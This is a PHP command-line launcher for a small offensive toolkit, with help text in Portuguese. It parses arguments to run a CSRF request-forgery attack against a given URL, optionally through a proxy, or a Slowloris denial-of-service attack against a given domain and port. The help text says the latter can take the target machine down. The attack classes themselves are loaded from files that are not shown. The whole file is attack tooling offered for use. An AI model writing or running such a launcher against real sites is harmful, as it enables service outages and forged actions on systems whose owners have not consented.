<?php 
Use Exploit\Socket;

if($argv[0] == 'exploit'){
    array_splice($argv, 0,1);
}

if(!isset($argv[0]) || $argv[0] == '-h'){
    echo " Exploits em PHP! \n Desenvolvido por: eded1263 \n";
    echo " \n Exploits disponíveis: \n -CSRF: para ataques de CSRF";
    echo " Como usar: \n -url : define a url que deve ser utilizada \n -p : Posfields a serem utilizados, p.E: \"chave=valor&chave=valor\"";
    echo " \n -proxy: url:porta, proxy a ser utilizado (opcional)";
    echo " \n -proxy-u: usuario para o proxy (opcional) ";
    echo " \n -proxy-s: senha para o proxy (opcional) ";
    echo " \n -h : exibe o menu de ajuda ";
    echo " \n \n -sock: instancia um socket que se conecta à um ip ";
    echo " Como usar: \n -dom : domínio que irá ser conectado, não usar http ou https! \n -p : porta";
    echo " \n -sl: se executado suficientes vezes, esse exploit irá causar um DOS na máquina de destino, caso esta seja afetável";
    die();
}

if(in_array('-CSRF', $argv)){
    require_once('CSRF.php');
    $exploit = new CSRF();
    $exploit->exploit($argv);
    die();
}
if(in_array('-sock', $argv) && in_array('-sl', $argv)){
    require_once('Socket.php');
    
    if(in_array('-dom', $argv)){
        $dom = $argv[array_search('-dom', $argv)+1];
    }else{
        echo "Nenhum dominio foi especificada";
        die();
    }

    if(in_array('-p', $argv)){
        $porta = $argv[array_search('-p', $argv)+1];
    }else{
        echo "Nenhuma porta foi especificada";
        die();
    }
    $exploit = new Socket($dom, $porta);
    $exploit->DOS_slow_loris();
    die();
}




